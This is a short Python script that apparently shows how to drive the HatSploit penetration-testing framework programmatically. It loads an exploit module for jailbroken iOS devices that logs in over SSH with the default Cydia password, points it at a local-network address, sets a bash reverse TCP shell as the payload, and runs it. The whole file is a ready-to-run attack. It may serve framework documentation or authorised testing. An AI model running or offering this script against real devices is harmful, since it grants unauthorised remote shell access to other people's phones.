from hatsploit.lib.config import Config

config = Config()
config.configure() # Read HatSploit configs and paths

from hatsploit.core.console import Console

console = Console()
console.start_hsf() # Load databases and core modules

from hatsploit.lib.modules import Modules

modules = Modules()
modules.use_module("exploit/apple_ios/ssh/cydia_default_password")

console.update_events() # Update HatSploit states and options

modules.set_current_module_option('HOST', '192.168.1.68')
modules.set_current_module_option('PAYLOAD', 'unix/generic/bash_reverse_tcp')

modules.run_current_module()
